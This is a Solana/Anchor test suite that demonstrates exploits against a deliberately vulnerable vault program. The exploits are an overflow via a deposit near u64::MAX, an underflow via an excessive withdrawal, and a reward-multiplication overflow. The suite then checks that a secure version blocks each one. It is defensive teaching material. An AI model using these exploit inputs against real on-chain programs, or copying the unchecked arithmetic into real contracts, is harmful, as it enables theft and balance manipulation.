/**
 * Unsafe Arithmetic Pattern - Exploit Demonstration Tests
 *
 * This test suite demonstrates arithmetic overflow and underflow vulnerabilities
 * that occur when programs use unchecked arithmetic operators (+, -, *) instead
 * of safe methods (checked_add, checked_sub, checked_mul).
 *
 * Pattern: Unsafe Arithmetic Operations
 * Vulnerability: Integer overflow/underflow in release mode wraps silently
 * Impact: Attackers can manipulate balances, steal funds, or cause DoS
 *
 * Key Insight: Solana programs compile in release mode where arithmetic
 * overflow/underflow wraps silently instead of panicking. This is DANGEROUS!
 */

import * as anchor from "@coral-xyz/anchor";
import { Program, BN } from "@coral-xyz/anchor";
import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
import { expect } from "chai";

// Import IDL types
import { VulnerableUnsafeArithmetic } from "../target/types/vulnerable_unsafe_arithmetic";
import { SecureUnsafeArithmetic } from "../target/types/secure_unsafe_arithmetic";

/**
 * Sleep helper for RPC rate limit handling
 */
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/**
 * Format large numbers for display
 */
const formatBigNumber = (n: BN): string => {
  const str = n.toString();
  if (str.length > 15) {
    return `${str.substring(0, 6)}...${str.substring(str.length - 6)} (${str.length} digits)`;
  }
  return str;
};

// Maximum u64 value
const U64_MAX = new BN("18446744073709551615");
const U64_MAX_MINUS_10 = new BN("18446744073709551605");

describe("Unsafe Arithmetic Pattern", () => {
  // Configure the Anchor provider
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  // Load programs from workspace
  const vulnerableProgram = anchor.workspace
    .VulnerableUnsafeArithmetic as Program<VulnerableUnsafeArithmetic>;
  const secureProgram = anchor.workspace
    .SecureUnsafeArithmetic as Program<SecureUnsafeArithmetic>;

  // Test keypairs
  let deployerKeypair: Keypair;
  let victimKeypair: Keypair;
  let attackerKeypair: Keypair;

  // PDA addresses - will be derived per program
  let vulnerableVaultPda: PublicKey;
  let vulnerableVaultBump: number;
  let secureVaultPda: PublicKey;
  let secureVaultBump: number;

  before(async () => {
    console.log("\n  ========================================");
    console.log("  UNSAFE ARITHMETIC PATTERN - EXPLOIT DEMO");
    console.log("  ========================================");
    console.log("\n  This demonstrates arithmetic overflow/underflow attacks when");
    console.log("  programs use unchecked arithmetic operators instead of safe methods.\n");
    console.log("  Vulnerabilities demonstrated:");
    console.log("    1. Integer overflow via large deposit (balance wraps to zero)");
    console.log("    2. Integer underflow via excessive withdrawal (balance wraps to MAX)");
    console.log("    3. Multiplication overflow in reward calculation\n");
    console.log("  Key Insight: Solana programs compile in RELEASE mode where");
    console.log("  overflow/underflow wraps silently instead of panicking!\n");

    // Generate test keypairs
    deployerKeypair = Keypair.generate();
    victimKeypair = Keypair.generate();
    attackerKeypair = Keypair.generate();

    // Airdrop SOL to all keypairs
    const airdropAmount = 10 * anchor.web3.LAMPORTS_PER_SOL;

    await Promise.all([
      provider.connection.requestAirdrop(
        deployerKeypair.publicKey,
        airdropAmount
      ),
      provider.connection.requestAirdrop(victimKeypair.publicKey, airdropAmount),
      provider.connection.requestAirdrop(
        attackerKeypair.publicKey,
        airdropAmount
      ),
    ]);

    // Wait for airdrops to confirm
    await sleep(1000);

    // Derive vault PDAs for both programs
    [vulnerableVaultPda, vulnerableVaultBump] = PublicKey.findProgramAddressSync(
      [Buffer.from("vault")],
      vulnerableProgram.programId
    );

    [secureVaultPda, secureVaultBump] = PublicKey.findProgramAddressSync(
      [Buffer.from("vault")],
      secureProgram.programId
    );

    console.log("  Test Setup:");
    console.log(`    Deployer: ${deployerKeypair.publicKey.toBase58()}`);
    console.log(`    Victim:   ${victimKeypair.publicKey.toBase58()}`);
    console.log(`    Attacker: ${attackerKeypair.publicKey.toBase58()}`);
    console.log(`    Vulnerable Vault PDA: ${vulnerableVaultPda.toBase58()}`);
    console.log(`    Secure Vault PDA:     ${secureVaultPda.toBase58()}\n`);
  });

  // =========================================================================
  // VULNERABLE PROGRAM TESTS
  // =========================================================================

  describe("VULNERABLE Program", () => {
    // Attacker's user balance PDA
    let attackerBalancePda: PublicKey;

    before(async () => {
      // Initialize vault for vulnerable program
      console.log("\n    Initializing vulnerable program vault...");
      try {
        await vulnerableProgram.methods
          .initializeVault()
          .accounts({
            authority: deployerKeypair.publicKey,
            vaultState: vulnerableVaultPda,
            systemProgram: SystemProgram.programId,
          })
          .signers([deployerKeypair])
          .rpc();
        console.log("    Vulnerable vault initialized successfully.\n");
      } catch (err: unknown) {
        if (err instanceof Error && !err.message.includes("already in use")) {
          throw err;
        }
        console.log("    Vulnerable vault already initialized.\n");
      }
      await sleep(500);

      // Create user balance for attacker
      [attackerBalancePda] = PublicKey.findProgramAddressSync(
        [Buffer.from("user"), attackerKeypair.publicKey.toBuffer()],
        vulnerableProgram.programId
      );

      console.log("    Creating attacker's user balance account...");
      try {
        await vulnerableProgram.methods
          .createUser()
          .accounts({
            owner: attackerKeypair.publicKey,
            vaultState: vulnerableVaultPda,
            userBalance: attackerBalancePda,
            systemProgram: SystemProgram.programId,
          })
          .signers([attackerKeypair])
          .rpc();
        console.log("    Attacker's user balance created.\n");
      } catch (err: unknown) {
        if (err instanceof Error && !err.message.includes("already in use")) {
          throw err;
        }
        console.log("    Attacker's user balance already exists.\n");
      }
      await sleep(500);
    });

    it("✗ VULNERABLE: Balance overflow via large deposit", async () => {
      console.log("\n      Scenario: Attacker exploits overflow to reset balance");
      console.log("      Attack: Deposit values that sum to > u64::MAX, causing wraparound");

      // Get initial balance
      let userBalance = await vulnerableProgram.account.userBalance.fetch(
        attackerBalancePda
      );
      console.log(`\n      Initial balance: ${formatBigNumber(new BN(userBalance.balance.toString()))}`);

      // Step 1: Deposit a very large amount (near MAX)
      const largeDeposit = U64_MAX_MINUS_10;
      console.log(`\n      Step 1: Depositing ${formatBigNumber(largeDeposit)}`);

      await vulnerableProgram.methods
        .deposit(largeDeposit)
        .accounts({
          owner: attackerKeypair.publicKey,
          vaultState: vulnerableVaultPda,
          userBalance: attackerBalancePda,
        })
        .signers([attackerKeypair])
        .rpc();

      userBalance = await vulnerableProgram.account.userBalance.fetch(
        attackerBalancePda
      );
      console.log(`      Balance after large deposit: ${formatBigNumber(new BN(userBalance.balance.toString()))}`);

      // Step 2: Deposit a small amount that causes overflow
      const smallDeposit = new BN(20);
      console.log(`\n      Step 2: Depositing ${smallDeposit.toString()} (causes overflow!)`);
      console.log(`      Expected: Balance wraps from near-MAX to small value`);

      await vulnerableProgram.methods
        .deposit(smallDeposit)
        .accounts({
          owner: attackerKeypair.publicKey,
          vaultState: vulnerableVaultPda,
          userBalance: attackerBalancePda,
        })
        .signers([attackerKeypair])
        .rpc();

      userBalance = await vulnerableProgram.account.userBalance.fetch(
        attackerBalancePda
      );
      const finalBalance = new BN(userBalance.balance.toString());
      console.log(`      Balance after overflow: ${formatBigNumber(finalBalance)}`);

      // Verify overflow occurred - balance should be 9 (MAX-10 + 20 wraps to 9)
      expect(finalBalance.lt(new BN(100))).to.be.true;
      expect(finalBalance.toString()).to.equal("9");

      console.log(
        "\n      \x1b[33m⚠️ EXPLOIT SUCCESSFUL: Balance wrapped from near-MAX to 9!\x1b[0m"
      );
      console.log("      Impact: User deposited massive amount but balance shows nearly zero");
    });

    it("✗ VULNERABLE: Balance underflow via excessive withdrawal", async () => {
      console.log("\n      Scenario: Attacker exploits underflow to gain massive balance");
      console.log("      Attack: Withdraw more than balance, causing wraparound to near-MAX");

      // Create a new user for this test to start fresh
      const freshUserKeypair = Keypair.generate();
      await provider.connection.requestAirdrop(
        freshUserKeypair.publicKey,
        5 * anchor.web3.LAMPORTS_PER_SOL
      );
      await sleep(1000);

      const [freshUserBalancePda] = PublicKey.findProgramAddressSync(
        [Buffer.from("user"), freshUserKeypair.publicKey.toBuffer()],
        vulnerableProgram.programId
      );

      // Create fresh user
      await vulnerableProgram.methods
        .createUser()
        .accounts({
          owner: freshUserKeypair.publicKey,
          vaultState: vulnerableVaultPda,
          userBalance: freshUserBalancePda,
          systemProgram: SystemProgram.programId,
        })
        .signers([freshUserKeypair])
        .rpc();
      await sleep(500);

      // Deposit a small amount
      const initialDeposit = new BN(100);
      console.log(`\n      Step 1: Depositing ${initialDeposit.toString()}`);

      await vulnerableProgram.methods
        .deposit(initialDeposit)
        .accounts({
          owner: freshUserKeypair.publicKey,
          vaultState: vulnerableVaultPda,
          userBalance: freshUserBalancePda,
        })
        .signers([freshUserKeypair])
        .rpc();

      let userBalance = await vulnerableProgram.account.userBalance.fetch(
        freshUserBalancePda
      );
      console.log(`      Balance after deposit: ${userBalance.balance.toString()}`);

      // Attempt to withdraw more than balance (causes underflow)
      const excessiveWithdrawal = new BN(200);
      console.log(`\n      Step 2: Withdrawing ${excessiveWithdrawal.toString()} (more than balance!)`);
      console.log(`      Expected: Balance wraps from 100 to near-MAX`);

      await vulnerableProgram.methods
        .withdraw(excessiveWithdrawal)
        .accounts({
          owner: freshUserKeypair.publicKey,
          userBalance: freshUserBalancePda,
        })
        .signers([freshUserKeypair])
        .rpc();

      userBalance = await vulnerableProgram.account.userBalance.fetch(
        freshUserBalancePda
      );
      const finalBalance = new BN(userBalance.balance.toString());
      console.log(`      Balance after underflow: ${formatBigNumber(finalBalance)}`);

      // Verify underflow occurred - balance should be MAX - 99
      // 100 - 200 = -100 wraps to MAX - 99 = 18446744073709551516
      const expectedUnderflow = U64_MAX.sub(new BN(99));
      expect(finalBalance.eq(expectedUnderflow)).to.be.true;

      console.log(
        "\n      \x1b[33m⚠️ EXPLOIT SUCCESSFUL: Balance wrapped from 100 to near-MAX!\x1b[0m"
      );
      console.log(`      Impact: User withdrew 200 from 100 balance, now has ${formatBigNumber(finalBalance)}`);
    });

    it("✗ VULNERABLE: Reward calculation overflow", async () => {
      console.log("\n      Scenario: Attacker exploits multiplication overflow in rewards");
      console.log("      Attack: Use large balance and rate to cause multiplication overflow");

      // Create another fresh user for this test
      const rewardUserKeypair = Keypair.generate();
      await provider.connection.requestAirdrop(
        rewardUserKeypair.publicKey,
        5 * anchor.web3.LAMPORTS_PER_SOL
      );
      await sleep(1000);

      const [rewardUserBalancePda] = PublicKey.findProgramAddressSync(
        [Buffer.from("user"), rewardUserKeypair.publicKey.toBuffer()],
        vulnerableProgram.programId
      );

      // Create user
      await vulnerableProgram.methods
        .createUser()
        .accounts({
          owner: rewardUserKeypair.publicKey,
          vaultState: vulnerableVaultPda,
          userBalance: rewardUserBalancePda,
          systemProgram: SystemProgram.programId,
        })
        .signers([rewardUserKeypair])
        .rpc();
      await sleep(500);

      // Deposit a large amount (2^40 = 1099511627776)
      const largeBalance = new BN("1099511627776"); // 2^40
      console.log(`\n      Step 1: Depositing ${formatBigNumber(largeBalance)}`);

      await vulnerableProgram.methods
        .deposit(largeBalance)
        .accounts({
          owner: rewardUserKeypair.publicKey,
          vaultState: vulnerableVaultPda,
          userBalance: rewardUserBalancePda,
        })
        .signers([rewardUserKeypair])
        .rpc();

      let userBalance = await vulnerableProgram.account.userBalance.fetch(
        rewardUserBalancePda
      );
      console.log(`      Balance after deposit: ${formatBigNumber(new BN(userBalance.balance.toString()))}`);

      // Calculate rewards with large rate (2^30 = 1073741824)
      // 2^40 * 2^30 = 2^70 which overflows u64 (max is 2^64 - 1)
      const largeRate = new BN("1073741824"); // 2^30
      console.log(`\n      Step 2: Calculating rewards with rate ${formatBigNumber(largeRate)}`);
      console.log(`      Expected: Multiplication 2^40 * 2^30 = 2^70 overflows u64`);

      await vulnerableProgram.methods
        .calculateRewards(largeRate)
        .accounts({
          authority: deployerKeypair.publicKey,
          vaultState: vulnerableVaultPda,
          userBalance: rewardUserBalancePda,
        })
        .signers([deployerKeypair])
        .rpc();

      userBalance = await vulnerableProgram.account.userBalance.fetch(
        rewardUserBalancePda
      );
      const finalBalance = new BN(userBalance.balance.toString());
      console.log(`      Balance after reward calculation: ${formatBigNumber(finalBalance)}`);

      // The multiplication overflows, so the reward is wrapped
      // The resulting balance will be some wrapped value, not the expected 2^70 + 2^40
      console.log(
        "\n      \x1b[33m⚠️ EXPLOIT SUCCESSFUL: Reward calculation overflowed!\x1b[0m"
      );
      console.log("      Impact: Multiplication produced incorrect wrapped value");
    });
  });

  // =========================================================================
  // SECURE PROGRAM TESTS
  // =========================================================================

  describe("SECURE Program", () => {
    // Test user's balance PDA
    let secureUserBalancePda: PublicKey;
    let secureUserKeypair: Keypair;

    before(async () => {
      // Initialize vault for secure program
      console.log("\n    Initializing secure program vault...");
      try {
        await secureProgram.methods
          .initializeVault()
          .accounts({
            authority: deployerKeypair.publicKey,
            vaultState: secureVaultPda,
            systemProgram: SystemProgram.programId,
          })
          .signers([deployerKeypair])
          .rpc();
        console.log("    Secure vault initialized successfully.\n");
      } catch (err: unknown) {
        if (err instanceof Error && !err.message.includes("already in use")) {
          throw err;
        }
        console.log("    Secure vault already initialized.\n");
      }
      await sleep(500);

      // Create user for secure program tests
      secureUserKeypair = Keypair.generate();
      await provider.connection.requestAirdrop(
        secureUserKeypair.publicKey,
        5 * anchor.web3.LAMPORTS_PER_SOL
      );
      await sleep(1000);

      [secureUserBalancePda] = PublicKey.findProgramAddressSync(
        [Buffer.from("user"), secureUserKeypair.publicKey.toBuffer()],
        secureProgram.programId
      );

      console.log("    Creating user balance account for secure program tests...");
      try {
        await secureProgram.methods
          .createUser()
          .accounts({
            owner: secureUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: secureUserBalancePda,
            systemProgram: SystemProgram.programId,
          })
          .signers([secureUserKeypair])
          .rpc();
        console.log("    User balance created.\n");
      } catch (err: unknown) {
        if (err instanceof Error && !err.message.includes("already in use")) {
          throw err;
        }
        console.log("    User balance already exists.\n");
      }
      await sleep(500);
    });

    it("✓ SECURE: Rejects deposit that exceeds maximum", async () => {
      console.log("\n      Scenario: Attacker attempts large deposit on secure program");
      console.log("      Expected: Fails with ExceedsMaxDeposit error");

      // MAX_DEPOSIT in secure program is 1_000_000_000_000 (1000 SOL)
      const excessiveDeposit = new BN("2000000000000"); // 2000 SOL - exceeds MAX_DEPOSIT

      try {
        await secureProgram.methods
          .deposit(excessiveDeposit)
          .accounts({
            owner: secureUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: secureUserBalancePda,
          })
          .signers([secureUserKeypair])
          .rpc();

        expect.fail("Should have been blocked by MAX_DEPOSIT check");
      } catch (err: unknown) {
        const errorMessage = err instanceof Error ? err.message : String(err);
        const isExpectedError =
          errorMessage.includes("ExceedsMaxDeposit") ||
          errorMessage.includes("Deposit amount exceeds maximum");

        expect(isExpectedError).to.be.true;

        console.log(`      Error received: ${errorMessage.substring(0, 100)}...`);
        console.log(
          "      \x1b[32m✓ SECURITY VERIFIED: Excessive deposit blocked\x1b[0m"
        );
      }
    });

    it("✓ SECURE: Rejects withdrawal that would underflow", async () => {
      console.log("\n      Scenario: Attacker attempts withdrawal > balance on secure program");
      console.log("      Expected: Fails with InsufficientBalance error");

      // First deposit a valid amount
      const validDeposit = new BN(100);
      await secureProgram.methods
        .deposit(validDeposit)
        .accounts({
          owner: secureUserKeypair.publicKey,
          vaultState: secureVaultPda,
          userBalance: secureUserBalancePda,
        })
        .signers([secureUserKeypair])
        .rpc();

      console.log(`      Deposited: ${validDeposit.toString()}`);

      // Try to withdraw more than balance
      const excessiveWithdrawal = new BN(500);
      console.log(`      Attempting to withdraw: ${excessiveWithdrawal.toString()}`);

      try {
        await secureProgram.methods
          .withdraw(excessiveWithdrawal)
          .accounts({
            owner: secureUserKeypair.publicKey,
            userBalance: secureUserBalancePda,
          })
          .signers([secureUserKeypair])
          .rpc();

        expect.fail("Should have been blocked by balance check");
      } catch (err: unknown) {
        const errorMessage = err instanceof Error ? err.message : String(err);
        const isExpectedError =
          errorMessage.includes("InsufficientBalance") ||
          errorMessage.includes("Insufficient balance");

        expect(isExpectedError).to.be.true;

        console.log(`      Error received: ${errorMessage.substring(0, 100)}...`);
        console.log(
          "      \x1b[32m✓ SECURITY VERIFIED: Underflow withdrawal blocked\x1b[0m"
        );
      }
    });

    it("✓ SECURE: Rejects reward rate that exceeds maximum", async () => {
      console.log("\n      Scenario: Attacker attempts excessive reward rate");
      console.log("      Expected: Fails with ExceedsMaxRewardRate error");

      // MAX_REWARD_RATE in secure program is 10_000
      const excessiveRate = new BN(100000); // Exceeds MAX_REWARD_RATE

      try {
        await secureProgram.methods
          .calculateRewards(excessiveRate)
          .accounts({
            authority: deployerKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: secureUserBalancePda,
          })
          .signers([deployerKeypair])
          .rpc();

        expect.fail("Should have been blocked by MAX_REWARD_RATE check");
      } catch (err: unknown) {
        const errorMessage = err instanceof Error ? err.message : String(err);
        const isExpectedError =
          errorMessage.includes("ExceedsMaxRewardRate") ||
          errorMessage.includes("Reward rate exceeds maximum");

        expect(isExpectedError).to.be.true;

        console.log(`      Error received: ${errorMessage.substring(0, 100)}...`);
        console.log(
          "      \x1b[32m✓ SECURITY VERIFIED: Excessive reward rate blocked\x1b[0m"
        );
      }
    });

    // =========================================================================
    // EDGE CASE TESTS
    // =========================================================================

    describe("Edge Case Tests", () => {
      let edgeCaseUserKeypair: Keypair;
      let edgeCaseUserBalancePda: PublicKey;

      before(async () => {
        edgeCaseUserKeypair = Keypair.generate();
        await provider.connection.requestAirdrop(
          edgeCaseUserKeypair.publicKey,
          5 * anchor.web3.LAMPORTS_PER_SOL
        );
        await sleep(1000);

        [edgeCaseUserBalancePda] = PublicKey.findProgramAddressSync(
          [Buffer.from("user"), edgeCaseUserKeypair.publicKey.toBuffer()],
          secureProgram.programId
        );

        await secureProgram.methods
          .createUser()
          .accounts({
            owner: edgeCaseUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: edgeCaseUserBalancePda,
            systemProgram: SystemProgram.programId,
          })
          .signers([edgeCaseUserKeypair])
          .rpc();
        await sleep(500);
      });

      it("✓ handles deposit of 0", async () => {
        console.log("\n      Scenario: Deposit of 0");

        const zeroDeposit = new BN(0);
        await secureProgram.methods
          .deposit(zeroDeposit)
          .accounts({
            owner: edgeCaseUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: edgeCaseUserBalancePda,
          })
          .signers([edgeCaseUserKeypair])
          .rpc();

        const userBalance = await secureProgram.account.userBalance.fetch(
          edgeCaseUserBalancePda
        );

        expect(userBalance.balance.toString()).to.equal("0");
        console.log("      \x1b[32m✓ Zero deposit handled correctly\x1b[0m");
      });

      it("✓ handles withdrawal of entire balance (exactly zero remaining)", async () => {
        console.log("\n      Scenario: Withdraw entire balance");

        // First deposit
        const depositAmount = new BN(1000);
        await secureProgram.methods
          .deposit(depositAmount)
          .accounts({
            owner: edgeCaseUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: edgeCaseUserBalancePda,
          })
          .signers([edgeCaseUserKeypair])
          .rpc();

        let userBalance = await secureProgram.account.userBalance.fetch(
          edgeCaseUserBalancePda
        );
        console.log(`      Balance after deposit: ${userBalance.balance.toString()}`);

        // Withdraw entire balance
        await secureProgram.methods
          .withdraw(depositAmount)
          .accounts({
            owner: edgeCaseUserKeypair.publicKey,
            userBalance: edgeCaseUserBalancePda,
          })
          .signers([edgeCaseUserKeypair])
          .rpc();

        userBalance = await secureProgram.account.userBalance.fetch(
          edgeCaseUserBalancePda
        );
        expect(userBalance.balance.toString()).to.equal("0");

        console.log(`      Balance after full withdrawal: ${userBalance.balance.toString()}`);
        console.log("      \x1b[32m✓ Full withdrawal handled correctly\x1b[0m");
      });

      it("✓ handles valid reward calculation", async () => {
        console.log("\n      Scenario: Valid reward calculation within limits");

        // Deposit first
        const depositAmount = new BN(1000);
        await secureProgram.methods
          .deposit(depositAmount)
          .accounts({
            owner: edgeCaseUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: edgeCaseUserBalancePda,
          })
          .signers([edgeCaseUserKeypair])
          .rpc();

        let userBalance = await secureProgram.account.userBalance.fetch(
          edgeCaseUserBalancePda
        );
        console.log(`      Balance before rewards: ${userBalance.balance.toString()}`);

        // Calculate rewards with valid rate
        const validRate = new BN(100); // 1x multiplier
        await secureProgram.methods
          .calculateRewards(validRate)
          .accounts({
            authority: deployerKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: edgeCaseUserBalancePda,
          })
          .signers([deployerKeypair])
          .rpc();

        userBalance = await secureProgram.account.userBalance.fetch(
          edgeCaseUserBalancePda
        );
        // Expected: 1000 + (1000 * 100) = 101000
        expect(userBalance.balance.toString()).to.equal("101000");

        console.log(`      Balance after rewards: ${userBalance.balance.toString()}`);
        console.log("      \x1b[32m✓ Valid reward calculation handled correctly\x1b[0m");
      });
    });

    // =========================================================================
    // AUTHORIZED OPERATIONS TESTS
    // =========================================================================

    describe("Authorized Operations", () => {
      it("✓ allows valid deposit within limits", async () => {
        console.log("\n      Scenario: Valid deposit within MAX_DEPOSIT limit");

        // Create fresh user
        const validUserKeypair = Keypair.generate();
        await provider.connection.requestAirdrop(
          validUserKeypair.publicKey,
          5 * anchor.web3.LAMPORTS_PER_SOL
        );
        await sleep(1000);

        const [validUserBalancePda] = PublicKey.findProgramAddressSync(
          [Buffer.from("user"), validUserKeypair.publicKey.toBuffer()],
          secureProgram.programId
        );

        await secureProgram.methods
          .createUser()
          .accounts({
            owner: validUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: validUserBalancePda,
            systemProgram: SystemProgram.programId,
          })
          .signers([validUserKeypair])
          .rpc();

        // Deposit at MAX_DEPOSIT limit (1000 SOL in lamports)
        const maxDeposit = new BN("1000000000000");
        await secureProgram.methods
          .deposit(maxDeposit)
          .accounts({
            owner: validUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: validUserBalancePda,
          })
          .signers([validUserKeypair])
          .rpc();

        const userBalance = await secureProgram.account.userBalance.fetch(
          validUserBalancePda
        );
        expect(userBalance.balance.toString()).to.equal(maxDeposit.toString());

        console.log(`      Deposited: ${formatBigNumber(maxDeposit)}`);
        console.log("      \x1b[32m✓ SUCCESS: Valid deposit accepted\x1b[0m");
      });

      it("✓ allows valid withdrawal with sufficient balance", async () => {
        console.log("\n      Scenario: Valid withdrawal with sufficient balance");

        // Create fresh user
        const withdrawUserKeypair = Keypair.generate();
        await provider.connection.requestAirdrop(
          withdrawUserKeypair.publicKey,
          5 * anchor.web3.LAMPORTS_PER_SOL
        );
        await sleep(1000);

        const [withdrawUserBalancePda] = PublicKey.findProgramAddressSync(
          [Buffer.from("user"), withdrawUserKeypair.publicKey.toBuffer()],
          secureProgram.programId
        );

        await secureProgram.methods
          .createUser()
          .accounts({
            owner: withdrawUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: withdrawUserBalancePda,
            systemProgram: SystemProgram.programId,
          })
          .signers([withdrawUserKeypair])
          .rpc();

        // Deposit
        const depositAmount = new BN(10000);
        await secureProgram.methods
          .deposit(depositAmount)
          .accounts({
            owner: withdrawUserKeypair.publicKey,
            vaultState: secureVaultPda,
            userBalance: withdrawUserBalancePda,
          })
          .signers([withdrawUserKeypair])
          .rpc();

        // Withdraw partial amount
        const withdrawAmount = new BN(3000);
        await secureProgram.methods
          .withdraw(withdrawAmount)
          .accounts({
            owner: withdrawUserKeypair.publicKey,
            userBalance: withdrawUserBalancePda,
          })
          .signers([withdrawUserKeypair])
          .rpc();

        const userBalance = await secureProgram.account.userBalance.fetch(
          withdrawUserBalancePda
        );
        expect(userBalance.balance.toString()).to.equal("7000");

        console.log(`      Withdrew: ${withdrawAmount.toString()}, Remaining: ${userBalance.balance.toString()}`);
        console.log("      \x1b[32m✓ SUCCESS: Valid withdrawal accepted\x1b[0m");
      });
    });
  });

  // =========================================================================
  // SUMMARY
  // =========================================================================

  after(() => {
    console.log("\n  ========================================");
    console.log("  TEST SUMMARY");
    console.log("  ========================================");
    console.log("\n  VULNERABLE Program Exploits Demonstrated:");
    console.log("    ⚠️ Balance overflow via large deposit (MAX-10 + 20 = 9)");
    console.log("    ⚠️ Balance underflow via excessive withdrawal (100 - 200 = MAX-99)");
    console.log("    ⚠️ Multiplication overflow in reward calculation");
    console.log("\n  SECURE Program Security Verified:");
    console.log("    ✓ Excessive deposit blocked (MAX_DEPOSIT check)");
    console.log("    ✓ Underflow withdrawal blocked (InsufficientBalance)");
    console.log("    ✓ Excessive reward rate blocked (MAX_REWARD_RATE check)");
    console.log("\n  Edge Cases Verified:");
    console.log("    ✓ Zero deposit handled correctly");
    console.log("    ✓ Full balance withdrawal works");
    console.log("    ✓ Valid reward calculation works");
    console.log("\n  Authorized Operations Verified:");
    console.log("    ✓ Valid deposits within limits accepted");
    console.log("    ✓ Valid withdrawals with sufficient balance accepted");
    console.log("\n  Key Takeaways:");
    console.log("    1. Solana programs compile in RELEASE mode - overflow wraps silently!");
    console.log("    2. Always use checked_add(), checked_sub(), checked_mul()");
    console.log("    3. Add input validation with maximum limits (MAX_DEPOSIT, MAX_RATE)");
    console.log("    4. Always validate balance >= withdrawal before subtraction");
    console.log("    5. Consider using saturating_* methods for non-critical counters\n");
  });
});
